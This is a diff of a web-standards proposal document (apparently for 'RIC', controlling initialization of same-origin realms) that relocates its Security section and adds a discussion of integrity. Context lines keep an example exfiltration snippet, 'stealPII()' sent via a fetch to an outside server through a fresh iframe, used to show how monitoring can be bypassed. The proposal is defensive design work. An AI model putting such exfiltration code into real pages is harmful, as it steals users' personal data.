@@ -38,10 +38,10 @@ document.body.appendChild(iframe);
 * [Goals](#Goals)
 * [Proposal](#Proposal)
 * [Example](#Example)
-* [Security](#Security)
 * [Use Cases](#Use-Cases)
     * [Safe Composability](#safe-composability-sandboxing--confinement)
     * [Application Monitoring](#application-monitoring-security--errors--performance--ux)
+* [Security](#Security)
 * [Value](#Value)
     * [User Experience](#User-Experience)
     * [Improved Composability](#Improved-Composability)
@@ -244,10 +244,6 @@ const payload = stealPII()
 newFetchInstance(`https://${server}/${path}/?payload=` + payload) 
 ```
 
-## Security
-
-TODO
-
 ## Use Cases
 
 Here are some use cases introduced by the community which led to the composition of this proposal.
@@ -292,6 +288,28 @@ document.body.appendChild(document.createElement('iframe')).contentWindow.fetch(
 ```
 
 The conclusion is that not being able to enforce such services at a very specific time (earlier than all other scripts) to all same origin realms of the app (as opposed to its top most realm only), significantly narrows down the reach such services have, which attackers can abuse.
+
+## Security
+
+This section explores this proposal's impact on security from the perspective of the well known [CIA](https://agoric.com/blog/technology/a-taxonomy-of-security-issues) (Confidentiality,Integrity,Availability) security standard.
+
+### Integrity
+
+Reading through the different sections of this proposal makes it clear RIC is a security feature that aspires to support integrity specifically.
+
+As described in this document, same origin realms are a power that can allow untrusted code that's invited to run within the same context of a given web app to undermine its will to apply its own set of rules and restrictions on its hosting envirnoment.
+
+While such rules and restrictions are applicable via JavaScript runtime virtualization, that statement does not hold against the power to form same origin realms, which is untamable.
+
+RIC aspires to provide web apps the power to tame it, by allowing them to execute their code within such realms before any other hosted code, so that they can apply their rules and restrictions within them too.
+
+Therefore, in this context, apps using JavaScript runtime virtualization to introduce their own set of rules and restrictions can be thought of an act of preserving a high level of integrity.
+
+Since the power to create same origin realms undermine this goal, it by defenition lowers that level of integrity.
+
+Therefore, by providing a way to restore the power to control the creation of such realms to the app, RIC aspires to recover its integrity level.
+
+To summarize, RIC isn't a standalone security feature, but one that compliments the attempts of app builders and security vendors to harden the integrity of web apps.
 
 ## Value
 
